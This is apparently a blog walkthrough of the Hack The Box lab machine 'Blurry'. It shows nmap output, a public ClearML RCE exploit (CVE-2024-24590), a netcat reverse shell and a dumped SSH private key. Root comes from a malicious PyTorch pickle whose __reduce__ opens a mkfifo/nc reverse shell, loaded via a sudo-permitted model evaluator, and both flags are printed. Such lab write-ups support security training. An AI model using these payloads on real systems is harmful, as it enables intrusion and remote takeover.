---
title: "Blurry from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Blurry from HTB
[page](https://app.hackthebox.com/machines/Blurry)
`Nmap`gave this:
```bash
$ nmap -sCV --min-rate 4000 -Pn 10.10.11.19
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 20:48 +04
Nmap scan report for app.blurry.htb (10.10.11.19)
Host is up (0.18s latency).
Not shown: 918 filtered tcp ports (no-response), 80 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: ClearML
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.22 seconds
```
There is site on this so lets add it to `/etc/hosts`:
```
10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb api.blurry.htb
```
After accessing the `blurry.htb`you will get why i added all those additional subdomains.
![](/assets/images/Screenshot from 2024-08-03 21-44-14.png)
There is subdomains.
Also there is instruction to what to do, so do it, set it up. Don't do the last part.
After searching for the `clearML`exploits i got to this `github repostiroy`for RCE exploit.
```bash
$ git clone https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit.git
$ cd CVE-2024-24590-ClearML-RCE-Exploit
$ python3 exploit.py
```
After running it select the `2`option and give the stuff it tells you. It will make the server connect to you. **Don't forget `NetCat`**
```bash
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.47] from (UNKNOWN) [10.10.11.19] 50934
bash: cannot set terminal process group (65981): Inappropriate ioctl for device
bash: no job control in this shell
jippity@blurry:~$ ls
ls
automation
clearml.conf
create_evil.py
evil.pth
script.py
user.txt
jippity@blurry:~$ cat user.txt
cat user.txt
a499da12aac54d2415546d560ef24d4c
```
***
user flag: a499da12aac54d2415546d560ef24d4c
***
```bash
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.47] from (UNKNOWN) [10.10.11.19] 50934
bash: cannot set terminal process group (65981): Inappropriate ioctl for device
bash: no job control in this shell$ ls -la
ls -la
total 72
drwxr-xr-x 6 jippity jippity  4096 Aug  3 12:21 .
drwxr-xr-x 3 root    root     4096 Feb  6 14:00 ..
drwxr-xr-x 2 jippity jippity  4096 Aug  3 09:40 automation
lrwxrwxrwx 1 root    root        9 Feb 17 13:03 .bash_history -> /dev/null
-rw-r--r-- 1 jippity jippity   220 Feb  6 14:00 .bash_logout
-rw-r--r-- 1 jippity jippity  3570 Feb  6 14:25 .bashrc
drwxr-xr-x 9 jippity jippity  4096 Feb  8 10:07 .clearml
-rw-r--r-- 1 jippity jippity 11007 Feb 17 11:07 clearml.conf
-rw-r--r-- 1 jippity jippity    29 Feb  6 14:41 .clearml_data.json
-rw-r--r-- 1 jippity jippity   155 Aug  3 12:21 create_evil.py
-rw-r--r-- 1 jippity jippity   852 Aug  3 12:21 evil.pth
-rw-r--r-- 1 jippity jippity    22 Feb  8 10:16 .gitconfig
drwx------ 5 jippity jippity  4096 Feb  6 14:46 .local
-rw-r--r-- 1 jippity jippity   807 Feb  6 14:00 .profile
lrwxrwxrwx 1 root    root        9 Feb 17 13:03 .python_history -> /dev/null
-rw-r--r-- 1 jippity jippity   741 Aug  3 10:12 script.py
drwx------ 2 jippity jippity  4096 Aug  3 05:22 .ssh
-rw-r----- 1 root    jippity    33 Aug  2 06:01 user.txt
```
there is `.ssh`directory and probably you will use it for `ssh`connection.
```bash
jippity@blurry:~$ cd .ssh
cd .ssh
jippity@blurry:~/.ssh$ ls
ls
authorized_keys
demo.pth
id_rsa
id_rsa.pub
jippity@blurry:~/.ssh$ cat id
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
Copy it and store it in some file that you will use to connect with `ssh`:
```
nano rsa << the OPENSSH key
```
then connect to `ssh`:
```bash
$ ssh -i rsa jippity@10.10.11.19
```
And you will get the connection.
```bash
$ sudo -l
Matching Defaults entries for jippity on blurry:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
   (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```
This is the thing you can do without sudo.
On the machine there is `script.py`that you will be needing to get the `root shell`but you need to modify it a bit:
```bash
$ cat script.py
import torch
import torch.nn as nn
import os

class MaliciousModel(nn.Module):
    # PyTorch's base class for all neural network modules
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.dense = nn.Linear(10, 1)

    # Define how the data flows through the model
    def forward(self, turi): # Passes input through the linear layer.
        return self.dense(turi)

    # Overridden __reduce__ Method
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.47 4444 >/tmp/f"
        return os.system, (cmd,)

# Create an instance of the model
malicious_model = MaliciousModel()

# Save the model using torch.save
torch.save(malicious_model, 'help.pth')
```
1. The IP and The port You want to get connection on.
2. At the end as what name do you want program to save the file. From `turi.pth-> help.pth`.
Run the script and copy it to `/models/`directory for it to work.
```bash
$ python3 script.py
$ cp help.pth /models/
```
In other terminal start `nc -nlvp 4444`and then in `ssh`terminal run the code:
```bash
$ /usr/bin/evaluate_model /models/help.pth
```
And then you will get the connection on `NetCat`as root:
```bash
# cat /root/root.txt
b975dc3b2ca5a27ebe1c1ee3e391ce98
```
***
root flag: b975dc3b2ca5a27ebe1c1ee3e391ce98
***
![](/assets/images/Screenshot from 2024-08-03 21-40-29.png)
